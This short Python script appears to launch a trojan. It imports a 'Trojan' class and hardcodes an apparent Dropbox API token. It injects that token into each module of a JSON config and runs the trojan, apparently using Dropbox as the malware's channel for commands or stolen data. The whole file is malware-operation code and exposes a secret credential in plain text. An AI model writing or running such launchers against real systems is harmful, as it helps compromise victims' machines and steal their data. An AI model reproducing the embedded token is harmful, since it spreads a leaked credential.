import json
from trojan import Trojan

dropbox_token = 'sl.Bc5Z_SIlWlY5TY6Sn5Qb3VxfGMHwttWbROLwHLNWNaoFK7WP2Ijj0f9PtYodXs__p-vOUakHqR6FoohlNfLnvyPQLvBekOLNnug9F-BwV6gsfqPUWo0742ocoDZxkVKlPoQF5r3D'

with open('configs_test_1.json', 'r') as f:
    config = json.loads(f.read())

for module in config:
    if 'dropbox_token' in config[module]:
        config[module]['dropbox_token'] = dropbox_token

Trojan(config).run()